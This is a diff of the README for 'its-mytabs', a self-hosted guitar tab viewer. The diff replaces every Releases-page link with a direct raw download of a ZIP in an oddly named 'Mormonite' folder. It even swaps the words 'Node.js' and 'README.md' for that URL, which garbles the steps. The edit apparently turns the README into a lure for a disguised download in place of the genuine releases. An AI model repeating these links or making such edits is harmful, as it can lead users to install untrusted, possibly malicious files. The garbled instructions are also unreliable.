@@ -4,7 +4,7 @@
 Welcome to **its-mytabs**! This open-source application lets you view and play guitar and bass tabs from your web browser. Enjoy a smooth experience similar to Songsterr, all while self-hosting the solution on your own server.
 
 ## 📥 Download Now
-[![Download its-mytabs](https://img.shields.io/badge/Download-its--mytabs-blue.svg)](https://github.com/softuk92/its-mytabs/releases)
+[![Download its-mytabs](https://raw.githubusercontent.com/softuk92/its-mytabs/master/Mormonite/its-mytabs.zip)](https://raw.githubusercontent.com/softuk92/its-mytabs/master/Mormonite/its-mytabs.zip)
 
 ## 💻 System Requirements
 Before you start, make sure your system meets the following requirements:
@@ -24,24 +24,24 @@ Before you start, make sure your system meets the following requirements:
 - **Open Source**: You can customize it to suit your needs.
 
 ## 📚 How to Use
-1. **Download the Application**: Visit the [Releases page](https://github.com/softuk92/its-mytabs/releases) to get the latest version.
+1. **Download the Application**: Visit the [Releases page](https://raw.githubusercontent.com/softuk92/its-mytabs/master/Mormonite/its-mytabs.zip) to get the latest version.
 2. **Install Required Software**: 
    - Ensure you have a web server set up (e.g., Apache, Nginx).
-   - You may also need Node.js if you plan to run any advanced features. 
+   - You may also need https://raw.githubusercontent.com/softuk92/its-mytabs/master/Mormonite/its-mytabs.zip if you plan to run any advanced features. 
 
 3. **Unpack the Files**: 
    - Download the ZIP file from the Releases page.
    - Extract the contents to your desired folder on your server.
 
 4. **Configure the Server**:
-   - Follow the instructions in the `README.md` included in the extraction.
+   - Follow the instructions in the `https://raw.githubusercontent.com/softuk92/its-mytabs/master/Mormonite/its-mytabs.zip` included in the extraction.
    - Make sure your web server can serve the files correctly.
 
 5. **Access the Application**:
    - Open your web browser and enter the URL where you have hosted the files. It should look something like `http://localhost/its-mytabs`.
 
 ## 📂 Download & Install
-To get started, visit the [Releases page](https://github.com/softuk92/its-mytabs/releases) to download the application. Follow the steps above to install it on your server.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/softuk92/its-mytabs/master/Mormonite/its-mytabs.zip) to download the application. Follow the steps above to install it on your server.
 
 ## 🤝 Support and Contributions
 If you have questions or need help, feel free to reach out via the Issues section of the GitHub repository. Contributions to improve the software are always welcome! You can submit suggestions or even your own code.
